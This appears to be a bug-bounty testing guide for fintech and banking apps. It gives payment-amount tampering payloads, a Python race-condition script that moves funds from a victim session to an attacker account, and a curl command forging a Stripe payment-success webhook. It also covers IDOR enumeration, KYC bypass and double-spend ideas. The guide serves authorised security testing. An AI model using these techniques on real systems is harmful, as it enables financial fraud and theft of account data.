# Fintech & Banking — Target Guide

> Financial apps are the highest-paying programs. Every vulnerability directly ties to monetary loss or regulatory risk, which justifies Critical/High ratings quickly.

---

## High-Value Attack Surface

**Authentication systems** — MFA, biometric login, session tokens for financial transactions

**Payment flows** — card processing, transfers, withdrawals, crypto transactions

**Account management** — KYC/identity verification, account upgrade flows

**API layer** — open banking APIs, third-party integrations (Plaid, Stripe, etc.)

**Transaction history** — IDOR to read other users' financial data

**Webhook endpoints** — payment processor callbacks (Stripe, PayPal, Paddle)

---

## Phase 1 — Recon Focus

```bash
# Find API docs (banks often expose these for partners)
/api/v1, /api/v2, /api-docs, /swagger.json, /openapi.json

# Find subdomains for:
api., developer., sandbox., staging., uat., admin., dashboard.,
partners., open-banking., payments., webhooks.

# Look for open banking standards
# UK: FCA-regulated, Open Banking API spec
# EU: PSD2 compliance endpoints
# Look for: /aisp, /pisp, /cbpii endpoints

# Check for exposed test/sandbox environments
sandbox.company.com, test.company.com, dev.company.com
# Sandbox often has weaker controls than production
```

---

## Phase 2 — High-Impact Tests

### Payment Amount Manipulation
```bash
# Intercept any payment/withdrawal request
# Test negative amounts
{"amount": -100, "currency": "USD"}

# Test decimal precision abuse
{"amount": 0.001}   # some systems floor/ceil differently

# Test currency manipulation
{"amount": 100, "currency": "JPY"}  # instead of USD (100 JPY << 100 USD)

# Test parameter type confusion
{"amount": "100x"}
{"amount": null}
{"amount": [100]}
```

### Transaction Race Conditions
```bash
# Send duplicate withdraw/transfer requests simultaneously
# Classic: withdraw same balance twice before state update

import concurrent.futures, requests

def withdraw():
    return requests.post('/api/transfer',
        json={'amount': 1000, 'to': 'attacker_account'},
        cookies={'session': 'VICTIM_SESSION'})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(withdraw) for _ in range(20)]
    for f in futures:
        print(f.result().status_code, f.result().json())
```

### KYC/Verification Bypass
```bash
# Test if unverified accounts can access verified features
# Direct URL to post-KYC features without completing KYC

# Test parameter manipulation in verification step
# {"verified": false} → {"verified": true}

# Skip steps in multi-step KYC
# Complete step 1, access step 3 URL directly

# Document upload vulnerabilities
# Upload malicious files as identity documents
# XXE via SVG/PDF upload
# Check if documents are publicly accessible
```

### Webhook Signature Bypass
```bash
# Stripe webhook example
# Test if webhook endpoint validates signature header
curl -X POST https://target.com/webhooks/stripe \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: INVALID" \
  -d '{"type": "payment_intent.succeeded", "data": {"object": {"amount": 100000}}}'

# If no validation: craft fake payment success events
# Replay a legitimate webhook with modified amount

# Test: can you trigger "payment succeeded" without actual payment?
```

### IDOR on Financial Data
```bash
# Transaction history
GET /api/transactions?account_id=12345  → try 12346, 12347

# Account details
GET /api/accounts/ACC_001  → try ACC_002

# Investment portfolio
GET /api/portfolio/USER_001  → try USER_002

# Wire transfer confirmation
GET /api/transfer/confirm/TXN_ID
```

### Open Banking API Abuse
```bash
# Check for improper consent validation
# Can you use another user's consent token?
# Can you access accounts beyond what was consented?

# Test TPP (Third Party Provider) authentication
# Missing client certificate validation
# Weak API key schemes

# Account Information Service attacks
GET /aisp/accounts              # all accounts
GET /aisp/accounts/{id}/balances
GET /aisp/accounts/{id}/transactions
```

---

## Phase 3 — Business Logic

```bash
# Loan/credit amount manipulation
# Can you get a loan for more than you qualify for?

# Referral/bonus abuse
# Can you refer yourself? Race condition on bonus credit?

# Currency conversion at wrong rate
# High-frequency trades exploiting stale rates

# Crypto deposit manipulation
# Send transaction with 0 confirmations
# Double-spend attempt with unconfirmed transaction

# Recurring payment manipulation
# Cancel subscription but keep access
# Downgrade plan mid-cycle for full refund
```

---

## Compliance-Driven Severity

In fintech, these findings escalate due to regulatory impact:

**PII exposure (name, SSN, account numbers)** → Critical (GDPR, PCI-DSS, CCPA)

**Account number enumeration** → High (data harvesting risk)

**Unauthenticated transaction access** → Critical (financial fraud enablement)

**KYC bypass** → Critical (money laundering risk, AML compliance failure)

**Lack of MFA on high-value transactions** → High (regulatory requirement in many jurisdictions)

---

## Tools Specific to Fintech

```bash
# API testing with authentication
httpie https://api.target.com/v1/accounts -A bearer -a TOKEN

# Stripe test card numbers (for sandbox environments)
4242424242424242   # Visa success
4000000000000002   # Generic decline
4000000000009995   # Insufficient funds

# Open Banking API validator
# https://openbanking.atlassian.net/wiki/spaces/DZ/pages/
```
